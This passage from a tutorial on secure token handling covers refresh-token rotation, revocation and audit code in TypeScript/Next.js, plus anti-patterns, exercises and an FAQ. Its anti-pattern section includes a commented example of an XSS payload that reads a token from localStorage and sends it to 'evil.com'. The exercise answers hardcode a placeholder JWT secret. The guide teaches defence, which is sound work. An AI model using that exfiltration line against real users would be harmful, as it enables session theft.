      },
      _count: true,
      orderBy: { _count: { action: 'desc' } },
    });
  }
}
```

---

## 8. Server-Side Refresh Endpoint Implementation

```typescript
// Next.js API Route: /api/auth/refresh
import { NextRequest, NextResponse } from 'next/server';

const tokenService = new TokenRotationService(prisma, logger);
const auditService = new TokenAuditService(prisma);

export async function POST(request: NextRequest) {
  // Retrieve Refresh Token from Cookie
  const refreshToken = request.cookies.get('refresh_token')?.value;

  if (!refreshToken) {
    return NextResponse.json(
      { error: 'Refresh token not found' },
      { status: 401 }
    );
  }

  const clientInfo = {
    ip: request.headers.get('x-forwarded-for') ||
        request.headers.get('x-real-ip') ||
        'unknown',
    userAgent: request.headers.get('user-agent') || 'unknown',
  };

  try {
    // Token refresh (with Rotation)
    const tokens = await tokenService.refreshTokens(refreshToken, clientInfo);

    // Audit log
    const payload = await verifyAccessToken(tokens.accessToken);
    await auditService.log({
      userId: payload.sub as string,
      action: 'token_refreshed',
      ipAddress: clientInfo.ip,
      userAgent: clientInfo.userAgent,
    });

    // Set new tokens in Cookie
    const response = NextResponse.json({
      expiresIn: 900, // 15 minutes (seconds)
    });

    return setTokenCookies(response, tokens);
  } catch (error) {
    if (error instanceof AuthError) {
      // Clear Cookie on failure
      const response = NextResponse.json(
        { error: error.message },
        { status: 401 }
      );
      return clearTokenCookies(response);
    }
    throw error;
  }
}
```

---

## 9. Anti-Patterns

### 9.1 Storing Tokens in localStorage

```typescript
// NG: Storing tokens in localStorage
// Tokens can be stolen via XSS attacks

// ✗ Dangerous pattern
function loginBad(credentials: { email: string; password: string }) {
  fetch('/api/auth/login', {
    method: 'POST',
    body: JSON.stringify(credentials),
  })
    .then((res) => res.json())
    .then((data) => {
      // NG: save to localStorage
      localStorage.setItem('accessToken', data.accessToken);
      localStorage.setItem('refreshToken', data.refreshToken);
    });
}

// Attacker's code (reads localStorage)
// If attacker injects XSS:
// const stolen = localStorage.getItem('accessToken');
// fetch('https://evil.com/steal', { body: stolen });

// ✓ Safe pattern: HttpOnly Cookie
async function loginGood(credentials: { email: string; password: string }) {
  const res = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(credentials),
    credentials: 'include', // receive Cookie
  });

  if (res.ok) {
    // Token is automatically saved in HttpOnly Cookie
    // Inaccessible from JavaScript (XSS-resistant)
    window.location.href = '/dashboard';
  }
}
```

### 9.2 Not Rotating the Refresh Token

```typescript
// NG: Keep reusing the same RT
async function refreshBad(refreshToken: string) {
  const user = await validateRefreshToken(refreshToken);

  // NG: reuse the same RT as-is
  const newAccessToken = await issueAccessToken(user.id, user.role);
  return { accessToken: newAccessToken, refreshToken }; // same RT
}
// If RT is leaked, attacker can obtain AT indefinitely

// ✓ OK: Issue a new RT every time with RT Rotation
async function refreshGood(refreshToken: string) {
  // Complete Rotation including reuse check and family management
  return tokenService.refreshTokens(refreshToken, clientInfo);
}
```

### 9.3 Including Tokens in URLs

```typescript
// NG: Including token in query parameter
// → Leaked via browser history, server logs, Referrer header

// ✗ Dangerous
const url = `https://api.example.com/data?token=${accessToken}`;
// Access log: GET /data?token=eyJhbGci... is recorded

// ✓ Safe: send via Authorization header or Cookie
const response = await fetch('https://api.example.com/data', {
  headers: {
    Authorization: `Bearer ${accessToken}`,
  },
});
```

### 9.4 Storing RT Without Hashing

```typescript
// NG: Store in plaintext in DB
await db.refreshToken.create({
  data: {
    token: refreshToken, // ✗ plaintext
    userId,
  },
});
// If DB is leaked, all user sessions can be hijacked

// ✓ OK: Hash before storing
await db.refreshToken.create({
  data: {
    token: hashToken(refreshToken), // ✓ SHA-256 hash
    userId,
  },
});
```

---

## 10. Security Best Practices Summary

```
Comprehensive token management checklist:

  ✓ Generation:
    → Cryptographically secure random values (crypto.randomBytes(32))
    → Sufficient entropy (256 bits or more)
    → Unique JTI for JWT (crypto.randomUUID())

  ✓ Storage:
    → Server: Store RT hashed (never in plaintext)
    → Browser: HttpOnly Cookie (do not use localStorage)
    → Mobile: Secure Enclave / Keychain / KeyStore
    → Memory: Also consider keeping AT in a memory variable

  ✓ Transport:
    → HTTPS only (TLS required)
    → Cookie: Secure + HttpOnly + SameSite=Lax/Strict
    → Authorization header: Bearer scheme
    → Never include in URL query parameters

  ✓ Verification:
    → Explicitly specify algorithm (prevent alg: 'none' attacks)
    → Verify issuer and audience
    → Always verify expiry
    → Check blacklist / version

  ✓ Revocation:
    → Delete RT on logout
    → Invalidate all tokens on password change
    → Invalidate entire family on anomaly detection
    → Immediately revoke all tokens for deactivated accounts

  ✓ Monitoring:
    → Monitor refresh frequency
    → Alert on RT reuse detection
    → Detect geographic anomalies (Impossible Travel)
    → Regular review of audit logs

  ✗ What NOT to do:
    → Include tokens in URL query parameters
    → Output tokens to application logs
    → Store in plaintext in DB
    → Store in localStorage
    → Make authorization decisions by decoding tokens on the frontend
    → Reuse RT without Rotation
    → Set the same expiry for AT and RT
```

---

## Practical Exercises

### Exercise 1: Basic — Implementing Refresh Token Rotation

**Task**: Implement a Token Rotation service that satisfies the following requirements.

1. Issue an AT + RT pair on login
2. Issue new AT + RT on refresh, and invalidate the old RT
3. If an already-used RT is used, invalidate all RTs in that family

```typescript
// Template
class SimpleTokenRotation {
  // Issue tokens on login
  async login(userId: string): Promise<{ accessToken: string; refreshToken: string }> {
    // TODO: implement
    throw new Error('Not implemented');
  }

  // Refresh tokens
  async refresh(refreshToken: string): Promise<{ accessToken: string; refreshToken: string }> {
    // TODO: implement
    throw new Error('Not implemented');
  }

  // Logout
  async logout(refreshToken: string): Promise<void> {
    // TODO: implement
    throw new Error('Not implemented');
  }
}
```

<details>
<summary>Model Answer</summary>

```typescript
import crypto from 'crypto';
import { SignJWT } from 'jose';

// In-memory store (use DB in production)
const tokenStore = new Map<string, {
  userId: string;
  familyId: string;
  usedAt: Date | null;
  expiresAt: Date;
}>();

function hashToken(token: string): string {
  return crypto.createHash('sha256').update(token).digest('hex');
}

const JWT_SECRET = new TextEncoder().encode('your-secret-key-at-least-32-chars');

class SimpleTokenRotation {
  async login(userId: string): Promise<{ accessToken: string; refreshToken: string }> {
    const familyId = crypto.randomUUID();
    const accessToken = await this.issueAT(userId);
    const refreshToken = crypto.randomBytes(32).toString('hex');

    tokenStore.set(hashToken(refreshToken), {
      userId,
      familyId,
      usedAt: null,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
    });

    return { accessToken, refreshToken };
  }

  async refresh(refreshToken: string): Promise<{ accessToken: string; refreshToken: string }> {
    const hashedRT = hashToken(refreshToken);
    const record = tokenStore.get(hashedRT);

    if (!record) {
      throw new Error('Invalid refresh token');
    }

    if (record.expiresAt < new Date()) {
      tokenStore.delete(hashedRT);
      throw new Error('Refresh token expired');
    }

    // Reuse detection
    if (record.usedAt) {
      // Invalidate entire family
      for (const [key, val] of tokenStore.entries()) {
        if (val.familyId === record.familyId) {
          tokenStore.delete(key);
        }
      }
      throw new Error('Token reuse detected! All sessions revoked.');
    }

    // Mark current RT as used
    record.usedAt = new Date();

    // Issue new token pair
    const newAccessToken = await this.issueAT(record.userId);
    const newRefreshToken = crypto.randomBytes(32).toString('hex');

    tokenStore.set(hashToken(newRefreshToken), {
      userId: record.userId,
      familyId: record.familyId, // same family
      usedAt: null,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
    });

    return { accessToken: newAccessToken, refreshToken: newRefreshToken };
  }

  async logout(refreshToken: string): Promise<void> {
    const hashedRT = hashToken(refreshToken);
    const record = tokenStore.get(hashedRT);

    if (record) {
      // Delete entire family
      for (const [key, val] of tokenStore.entries()) {
        if (val.familyId === record.familyId) {
          tokenStore.delete(key);
        }
      }
    }
  }

  private async issueAT(userId: string): Promise<string> {
    return new SignJWT({ sub: userId, type: 'access' })
      .setProtectedHeader({ alg: 'HS256' })
      .setExpirationTime('15m')
      .setJti(crypto.randomUUID())
      .sign(JWT_SECRET);
  }
}

// Test
async function test() {
  const service = new SimpleTokenRotation();

  // Login
  const { accessToken, refreshToken } = await service.login('user_1');
  console.log('Login OK:', !!accessToken, !!refreshToken);

  // Refresh
  const tokens2 = await service.refresh(refreshToken);
  console.log('Refresh OK:', !!tokens2.accessToken, !!tokens2.refreshToken);

  // Attempt reuse with old RT
  try {
    await service.refresh(refreshToken);
    console.log('ERROR: Should have thrown');
  } catch (e) {
    console.log('Reuse detected OK:', (e as Error).message);
  }

  // Confirm new RT is also invalidated
  try {
    await service.refresh(tokens2.refreshToken);
    console.log('ERROR: Should have thrown');
  } catch (e) {
    console.log('Family revoked OK:', (e as Error).message);
  }
}

test();
```

</details>

### Exercise 2: Advanced — Hybrid Revocation with Blacklist and Token Version

**Task**: Implement a composite revocation mechanism that satisfies the following requirements.

1. Normal logout: RT deletion only
2. Password change: Increment Token Version and delete all RTs
3. Security incident: Add to blacklist for immediate revocation

```typescript
// Template
class HybridRevocation {
  // Normal logout
  async logout(userId: string, familyId: string): Promise<void> {
    // TODO
  }

  // Password change
  async onPasswordChange(userId: string): Promise<void> {
    // TODO
  }

  // Immediate revocation (security incident)
  async emergencyRevoke(userId: string): Promise<void> {
    // TODO
  }

  // Token verification (3-layer check)
  async verifyToken(token: string): Promise<any> {
    // TODO
  }
}
```

<details>
<summary>Model Answer</summary>

```typescript
import { jwtVerify } from 'jose';

// In-memory store (use Redis + DB in production)
const blacklist = new Map<string, number>(); // JTI -> expiry timestamp
const userBlacklist = new Map<string, number>(); // userId -> revoked timestamp
const tokenVersions = new Map<string, number>(); // userId -> version
const refreshTokens = new Map<string, { userId: string; familyId: string }>();

const JWT_SECRET = new TextEncoder().encode('your-secret-key-at-least-32-chars');

class HybridRevocation {
  // Normal logout: RT deletion only (AT waits for natural expiry)
  async logout(userId: string, familyId: string): Promise<void> {
    for (const [key, val] of refreshTokens.entries()) {
      if (val.userId === userId && val.familyId === familyId) {
        refreshTokens.delete(key);
      }
    }
    console.log(`Logout: Revoked session ${familyId} for user ${userId}`);
  }

  // Password change: Token Version + delete all RTs
  async onPasswordChange(userId: string): Promise<void> {
    // Increment Token Version
    const currentVersion = tokenVersions.get(userId) || 0;
    tokenVersions.set(userId, currentVersion + 1);

    // Delete all RTs
    for (const [key, val] of refreshTokens.entries()) {
      if (val.userId === userId) {
        refreshTokens.delete(key);
      }
    }
    console.log(`Password changed: Version bumped to ${currentVersion + 1}`);
  }

  // Immediate revocation: Blacklist (instant even if AT is within expiry)
  async emergencyRevoke(userId: string): Promise<void> {
    // Per-user blacklist
    userBlacklist.set(userId, Date.now());

    // Also delete all RTs
    for (const [key, val] of refreshTokens.entries()) {
      if (val.userId === userId) {
        refreshTokens.delete(key);
      }
    }

    // Also increment Token Version
    const currentVersion = tokenVersions.get(userId) || 0;
    tokenVersions.set(userId, currentVersion + 1);

    console.log(`Emergency: User ${userId} fully revoked`);
  }

  // Token verification (3-layer check)
  async verifyToken(token: string): Promise<any> {
    // Layer 1: JWT signature verification
    const { payload } = await jwtVerify(token, JWT_SECRET);
    const userId = payload.sub as string;

    // Layer 2: Blacklist check (immediate revocation)
    const revokedAt = userBlacklist.get(userId);
    if (revokedAt && (payload.iat as number) * 1000 < revokedAt) {
      throw new Error('Token revoked (blacklist)');
    }

    const jtiRevoked = blacklist.has(payload.jti as string);
    if (jtiRevoked) {
      throw new Error('Token revoked (individual blacklist)');
    }

    // Layer 3: Token Version check (near-instant revocation)
    const currentVersion = tokenVersions.get(userId) || 0;
    if (payload.token_version !== undefined &&
        payload.token_version !== currentVersion) {
      throw new Error('Token revoked (version mismatch)');
    }

    return payload;
  }
}

// Test
async function testHybridRevocation() {
  const revocation = new HybridRevocation();

  // Scenario 1: Normal logout
  refreshTokens.set('rt1', { userId: 'user1', familyId: 'f1' });
  refreshTokens.set('rt2', { userId: 'user1', familyId: 'f2' });
  await revocation.logout('user1', 'f1');
  console.log('After logout - remaining RTs:', refreshTokens.size); // 1

  // Scenario 2: Password change
  refreshTokens.set('rt3', { userId: 'user2', familyId: 'f3' });
  refreshTokens.set('rt4', { userId: 'user2', familyId: 'f4' });
  await revocation.onPasswordChange('user2');
  console.log('After password change - user2 version:', tokenVersions.get('user2'));

  // Scenario 3: Emergency revocation
  await revocation.emergencyRevoke('user3');
  console.log('After emergency - user3 blacklisted at:', userBlacklist.get('user3'));
}

testHybridRevocation();
```

</details>

### Exercise 3: Advanced — Implementing a Token Monitoring Dashboard

**Task**: Design and implement a token monitoring API for administrators.

1. API to return a list of active sessions for a user
2. Logic to detect suspicious activity
3. API for individual and bulk session revocation

<details>
<summary>Model Answer</summary>

```typescript
import { NextRequest, NextResponse } from 'next/server';

// Session management API
// GET /api/admin/sessions/:userId
export async function getSessionsForUser(
  request: NextRequest,
  { params }: { params: { userId: string } }
) {
  const session = await auth();
  if (!session || session.user.role !== 'admin') {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }

  const manager = new TokenFamilyManager(prisma);
  const sessions = await manager.getActiveSessions(params.userId);

  return NextResponse.json({ sessions });
}

// DELETE /api/admin/sessions/:userId/:familyId
export async function revokeSession(
  request: NextRequest,
  { params }: { params: { userId: string; familyId: string } }
) {
  const session = await auth();
  if (!session || session.user.role !== 'admin') {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }

  const manager = new TokenFamilyManager(prisma);
  const result = await manager.revokeSession(params.userId, params.familyId);

  // Audit log
  await auditService.log({
    userId: params.userId,
    action: 'token_revoked',
    ipAddress: request.headers.get('x-forwarded-for') || 'unknown',
    userAgent: request.headers.get('user-agent') || 'unknown',
    metadata: {
      revokedBy: session.user.id,
      familyId: params.familyId,
      revokedCount: result.revokedCount,
    },
  });

  return NextResponse.json(result);
}

// DELETE /api/admin/sessions/:userId (revoke all sessions)
export async function revokeAllSessions(
  request: NextRequest,
  { params }: { params: { userId: string } }
) {
  const session = await auth();
  if (!session || session.user.role !== 'admin') {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }

  const manager = new TokenFamilyManager(prisma);
  const result = await manager.revokeAllSessions(params.userId);

  // Also add to blacklist (immediate revocation)
  const blacklistService = new TokenBlacklist(process.env.REDIS_URL!);
  await blacklistService.revokeAllForUser(params.userId);

  return NextResponse.json({
    ...result,
    message: `All ${result.revokedCount} sessions revoked for user ${params.userId}`,
  });
}

// GET /api/admin/security/suspicious-activity
export async function getSuspiciousActivity(request: NextRequest) {
  const session = await auth();
  if (!session || session.user.role !== 'admin') {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }

  const auditService = new TokenAuditService(prisma);

  // Suspicious activity in the last 24 hours
  const suspicious = await auditService.findSuspiciousActivity(24 * 60 * 60 * 1000);

  // Users with high refresh frequency
  const highFrequency = await prisma.$queryRaw`
    SELECT "userId", COUNT(*) as count
    FROM "TokenAuditLog"
    WHERE action = 'token_refreshed'
      AND "createdAt" > NOW() - INTERVAL '1 hour'
    GROUP BY "userId"
    HAVING COUNT(*) > 10
    ORDER BY count DESC
    LIMIT 20
  `;

  return NextResponse.json({
    tokenReuseDetections: suspicious.filter(
      (s: any) => s.action === 'token_reuse_detected'
    ),
    massRevocations: suspicious.filter(
      (s: any) => s.action === 'all_tokens_revoked'
    ),
    highRefreshFrequency: highFrequency,
    analyzedPeriod: '24h',
  });
}
```

</details>

---

## FAQ

### Q1: What is the optimal expiry for an Access Token?

For general web applications, 15 minutes is recommended. This value balances "minimizing damage on leak" and "not degrading user experience." Adjust to 5 minutes for finance/healthcare, or 1 hour for social media, depending on industry and risk level. The key point is not to rely solely on AT expiry for security. Combining Token Version and blacklist allows you to handle situations requiring immediate revocation.

### Q2: Why is an opaque token (random string) recommended for Refresh Tokens instead of JWT?

Since RT always references the DB on the server side for verification, the advantage of JWT's "stateless verification" does not apply. Moreover, JWT includes user information in the payload, which increases the risk on leakage. An opaque token (crypto.randomBytes) contains no information and is only compared against a hash in the DB, making it more secure.

### Q3: What happens if multiple refresh requests arrive simultaneously with Token Rotation?

If multiple refresh requests arrive with the same RT simultaneously, the second request may be flagged as "reuse detected" and the entire family may be invalidated. To prevent this, control concurrent refresh execution on the client side (see the `isRefreshing` flag in section 3.1). On the server side, providing a short grace period (e.g., 10 seconds) when checking `usedAt` on the RT can also prevent false positives due to network delays.

### Q4: Is it necessary to immediately invalidate the AT on logout?

Ideally yes, but since ATs are stateless, instant revocation requires a blacklist (Redis). For most applications, deleting the RT on logout is sufficient (AT naturally expires within 15 minutes at most). However, in finance, healthcare, and high-security environments, ATs should also be added to the blacklist for immediate revocation.

### Q5: How do you manage Token Families for multi-device support?

Issue an independent familyId for each device login. If a user logs in from an iPhone, familyId=A is issued; from a PC, familyId=B is issued. On logout, only the RT for the relevant familyId is deleted, and sessions on other devices are maintained. For the "logout from all devices" feature, delete all RTs for all familyIds of that user.

---

## Summary

| Item | Recommended Setting / Policy |
|------|------------------------------|
| Access Token expiry | 15 minutes (5 minutes to 1 hour depending on industry) |
| Refresh Token expiry | 7 days (up to 90 days for mobile) |
| RT Rotation | Required. Issue new RT on each use |
| Reuse detection | Immediately invalidate entire family |
| AT storage | HttpOnly Cookie (path=/api) |
| RT storage | HttpOnly Cookie (path=/api/auth) |
| RT storage in DB | Store as SHA-256 hash |
| Revocation method | Token Version + Blacklist (hybrid) |
| Monitoring | Refresh frequency, Impossible Travel, RT reuse detection |
| CSRF countermeasure | SameSite=Lax/Strict + CSRF token |

---

## Guides to Read Next

- [RBAC (Role-Based Access Control)](../03-authorization/00-rbac.md) — Designing role information to include in tokens
- [API Authorization](../03-authorization/02-api-authorization.md) — API access control using tokens
- Security Fundamentals — Basics of encryption and hashing

---

## References

1. Auth0. "Refresh Token Rotation." auth0.com/docs, 2024.
2. RFC 6749 §1.5. "Refresh Token." IETF, 2012.
3. RFC 6750. "The OAuth 2.0 Authorization Framework: Bearer Token Usage." IETF, 2012.
4. OWASP. "JSON Web Token Cheat Sheet." cheatsheetseries.owasp.org, 2024.
5. OWASP. "Session Management Cheat Sheet." cheatsheetseries.owasp.org, 2024.
6. NIST SP 800-63B. "Digital Identity Guidelines: Authentication and Lifecycle Management." 2020.
